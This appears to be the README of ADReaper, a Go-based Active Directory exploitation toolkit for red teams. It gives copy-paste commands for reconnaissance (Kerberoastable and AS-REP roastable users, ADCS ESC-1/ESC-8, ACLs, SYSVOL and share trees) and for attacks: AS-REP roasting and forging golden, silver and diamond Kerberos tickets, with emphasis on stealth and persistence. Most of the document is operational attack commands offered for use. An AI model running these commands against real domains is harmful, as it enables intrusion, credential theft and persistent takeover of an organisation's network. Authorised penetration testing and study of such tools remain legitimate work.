
# ⚔️ ADReaper v4.0.0 — Tactical AD Exploitation Toolkit
![image](https://i.ibb.co/23Vnfx23/image.png)
ADReaper is a professional-grade reconnaissance and exploitation tool designed for Red Teams and advanced penetration testers. It focuses on identifying complex misconfigurations and executing advanced Kerberos attacks.

## 🚀 One-Shot Quick Start
If you just landed on a workstation, run the **Domain Radiography** for a summary:
```powershell
.\adreaper.exe enum all -d lab.local -u user -p pass --dc-ip 192.168.1.10
```
Or use the **Massive Object Dump** for total visibility:
```powershell
.\adreaper.exe enum dump -d lab.local -u user -p pass
```

---

## 💾 Session Logging (Mirror Output)
You can now save all console activity to a `.txt` file using the `-o` flag. If the file extension is omitted, `.txt` is added automatically.
```powershell
.\adreaper.exe enum all -d lab.local -u user -p pass -o my_session
```
*Output will be saved to `my_session.txt` while still appearing in color on your console.*

---

## 🌍 Language-Aware Searching (Critical)
ADReaper uses **substring matching** for enumeration. In labs localized in other languages (e.g., Spanish), searching for English terms like "Administrators" or "Groups" will return 0 results because those strings do not exist in the object names or paths.

**Pro-Tip:** Use localized keywords based on the environment:
*   **English**: `Admins`, `Users`, `Computers`, `Domain`
*   **Spanish**: `Admins`, `Usuarios`, `Equipos`, `Dominio`

---

## 📖 Tactical Command Reference (Copy-Paste)

### 1. Advanced Reconnaissance
| Objective | Command |
| :--- | :--- |
| **Mirror Log to File** | `.\adreaper.exe enum all -o capture.txt -d lab.local -u user -p pass` |
| **Absolute Total Dump** | `.\adreaper.exe enum dump -d lab.local -u user -p pass` |
| **All-in-One Summary** | `.\adreaper.exe enum all -d lab.local -u user -p pass --dc-ip 192.168.1.10` |
| **User Discovery** | `.\adreaper.exe enum users -d lab.local -u user -p pass --dc-ip 192.168.1.10` |
| **Kerberoastable** | `.\adreaper.exe enum users --spn-only -d lab.local -u user -p pass` |
| **AS-REP Roastable** | `.\adreaper.exe enum users --asrep-only -d lab.local -u user -p pass` |
| **Search by Keyword** | `.\adreaper.exe enum groups --name "Admins" -d lab.local -u user -p pass` |
| **DC Discovery** | `.\adreaper.exe enum computers -d lab.local -u user -p pass` |
| **Local Admin Hunt** | `.\adreaper.exe enum local-admins -d lab.local -u user -p pass` |
| **Domain Policy** | `.\adreaper.exe enum domain -d lab.local -u user -p pass` |
| **ADCS ESC-1/ESC-8** | `.\adreaper.exe enum adcs -d lab.local -u user -p pass` |
| **Trust Analysis** | `.\adreaper.exe enum trusts -d lab.local -u user -p pass` |
| **ACL Analysis** | `.\adreaper.exe enum acls -d lab.local -u user -p pass` |

### 2. File & Share Exploration
| Objective | Command |
| :--- | :--- |
| **List Shares** | `.\adreaper.exe enum shares -d lab.local -u user -p pass` |
| **Global Tree View** | `.\adreaper.exe enum tree -d lab.local -u user -p pass` |
| **SYSVOL Audit** | `.\adreaper.exe enum tree --share SYSVOL --depth 5 -d lab.local -u user -p pass` |
| **Deep Share Recon** | `.\adreaper.exe enum tree --share all --depth 3 -d lab.local -u user -p pass` |

### 3. Advanced Attacks & Persistence
| Objective | Command |
| :--- | :--- |
| **AS-REP Roast** | `.\adreaper.exe attack asreproast -U targets.txt -d lab.local --dc-ip 192.168.1.10` |
| **Golden Ticket** | `.\adreaper.exe attack tickets --type golden --user Administrator --domain lab.local --sid S-1-5-21-... --hash <ntlm_hash>` |
| **Silver Ticket** | `.\adreaper.exe attack tickets --type silver --user Administrator --domain lab.local --sid S-1-5-21-... --hash <ntlm_hash> --spn cifs/DC01.lab.local` |
| **Diamond Ticket** | `.\adreaper.exe attack tickets --type diamond --user Administrator --domain lab.local --sid S-1-5-21-... --hash <ntlm_hash>` |

---

## 🛡️ Expert Features

### 💎 Kerberos Ticket Factory
The `--type diamond` ticket allows for stealthy persistence by modifying a legitimate Ticket Granting Ticket (TGT) rather than forging one from scratch.
*   **Golden**: Forged TGT for any user (Full Domain Control).
*   **Silver**: Forged TGS for a specific service on a specific host.
*   **Diamond**: Stealthy TGT modification via decryption/encryption.

### 🎯 Local Admin Hunting via GPO
Instead of performing noisy network scans, ADReaper parses `GptTmpl.inf` and `Groups.xml` from **SYSVOL**. It identifies which groups are added to the local "Administrators" group of workstations and cross-references them with domain members.
*   **Stealth**: No traffic to workstations.
*   **Offline**: Only requires LDAP and SMB access to the DC.

### 🔍 Robust Enumeration (v3.7.0)
The group enumeration engine (`enum groups`) now supports **substring matching** and automatically falls back to the **Common Name (CN)** if `sAMAccountName` is missing from the server response. This ensures that groups like "Domain Users" are always found, regardless of the Domain Controller's specific configuration.

---

## ⚙️ Requirements & Build
*   **Go** 1.21+
*   **Build**: `go build -o adreaper.exe main.go`

*(Note: Detection of CVEs has been removed in favor of direct configuration analysis and advanced persistence attacks).*
